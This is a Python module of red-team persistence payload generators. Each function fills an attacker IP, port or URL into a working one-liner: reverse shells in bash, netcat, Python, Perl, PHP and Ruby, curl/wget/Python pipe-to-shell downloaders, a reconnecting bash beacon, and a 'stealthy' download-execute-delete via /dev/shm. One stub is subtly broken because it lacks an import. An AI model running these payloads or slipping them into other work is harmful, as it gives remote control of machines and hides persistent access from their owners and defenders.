# master_persistence/payloads.py
"""
Common red team payloads for persistence testing.
All examples are for authorized, ethical use only.
"""

def revshell_bash(ip: str, port: int) -> str:
    """Basic Bash reverse shell"""
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

def revshell_bash_alt(ip: str, port: int) -> str:
    """Alternative Bash reverse shell (no -i flag)"""
    return f"0<&1; exec 21<>/dev/tcp/{ip}/{port}; sh <&21 >&21 2>&21"

def revshell_nc(ip: str, port: int) -> str:
    """Netcat reverse shell (mkfifo variant)"""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"

def revshell_nc_g(ip: str, port: int) -> str:
    """Netcat reverse shell with -e (if available)"""
    return f"nc -e /bin/sh {ip} {port}"

def revshell_python(ip: str, port: int) -> str:
    """Python reverse shell"""
    return (
        f'python -c \'import socket,subprocess,os;'
        f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        f's.connect(("{ip}",{port}));'
        f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
        f'p=subprocess.call(["/bin/sh","-i"]);\''
    )

def revshell_perl(ip: str, port: int) -> str:
    """Perl reverse shell"""
    return (
        f'perl -e \'use Socket;$i="{ip}";$p={port};'
        f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
        f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
        f'exec("/bin/sh -i");}};\''
    )

def revshell_php(ip: str, port: int) -> str:
    """PHP reverse shell (if PHP is available)"""
    return (
        f'php -r \'$sock=fsockopen("{ip}",{port});'
        f'exec("/bin/sh -i <&3 >&3 2>&3");\''
    )

def revshell_ruby(ip: str, port: int) -> str:
    """Ruby reverse shell"""
    return (
        f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;'
        f'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
    )

def download_exec_curl(url: str) -> str:
    """Curl download and execute (e.g., from C2)"""
    return f"curl -fsSL {url} | bash"

def download_exec_wget(url: str) -> str:
    """Wget download and execute"""
    return f"wget -qO- {url} | bash"

def download_exec_python(url: str) -> str:
    """Python download and execute"""
    return f"python -c 'import urllib.request; exec(urllib.request.urlopen(\"{url}\").read().decode())'"

def beacon_bash(ip: str, port: int, interval: int = 300) -> str:
    """Persistent Bash beacon (reconnects every N seconds)"""
    return (
        f'while true; do bash -i >& /dev/tcp/{ip}/{port} 0>&1; sleep {interval}; done'
    )

def meterpreter_python(ip: str, port: int) -> str:
    """Metasploit-style Python meterpreter stub (requires Metasploit listener)"""
    return (
        f'python -c "import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        f's.connect((\'{ip}\',{port}));[os.dup2(s.fileno(),i) for i in [0,1,2]];'
        f'subprocess.call([\'/bin/sh\',\'-i\'])"'
    )

def stealth_download_curl(url: str) -> str:
    """Stealthy curl to /dev/shm and execute"""
    return f"curl -fsSL {url} -o /dev/shm/.tmp.sh && bash /dev/shm/.tmp.sh && rm /dev/shm/.tmp.sh"

# More can be added: Java, Node.js, etc.